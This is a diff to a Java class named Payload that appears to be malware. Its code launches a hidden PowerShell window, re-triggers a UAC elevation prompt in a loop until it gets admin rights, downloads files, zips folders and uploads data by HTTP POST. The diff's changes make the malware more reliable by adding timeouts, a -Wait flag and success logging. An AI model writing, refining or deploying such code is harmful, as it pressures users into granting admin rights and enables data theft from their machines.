@@ -52,29 +52,21 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Powershell command to trigger UAC
             String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -Wait",
                 javaExe, jarPath, key, ip
             );
 
             while (true) {
                 log("Triggering UAC via PowerShell...");
-                
-                // Execute PowerShell
                 Process p = new ProcessBuilder(
                     "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand
                 ).start();
                 
-                // Wait for PowerShell to finish (it finishes instantly after firing the prompt)
-                p.waitFor();
-                
-                // If the UAC prompt is accepted, the new Admin process will lock the st.jar file.
-                // We can check if we are still not admin. If we are, sleep and retry.
-                Thread.sleep(3000); 
+                p.waitFor(); 
                 
                 if (isAdmin()) {
-                     log("We are suddenly admin? That's weird. Exiting loop.");
+                     log("We are Admin now? That's weird. Exiting loop.");
                      break;
                 }
                 
@@ -130,14 +122,21 @@ public class Payload {
 
     private static void downloadFile(String urlStr, File dest) {
         try {
+            // Use URL object directly to prevent DNS resolution issues
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+
             try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
                 byte[] buf = new byte[8192]; int len;
                 while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
             }
-        } catch (Exception e) { log("Download failed " + urlStr + ": " + e.toString()); }
+            log("Downloaded " + dest.getName() + " successfully.");
+        } catch (Exception e) { 
+            log("Download failed " + urlStr + ": " + e.toString()); 
+        }
     }
 
     private static void zipFolders(String[] folders, File zipFile) {
@@ -167,8 +166,11 @@ public class Payload {
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "application/json");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
             try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes()); }
             conn.getResponseCode();
+            log("Upload successful.");
         } catch (Exception e) { log("Upload failed: " + e.toString()); }
     }
 }
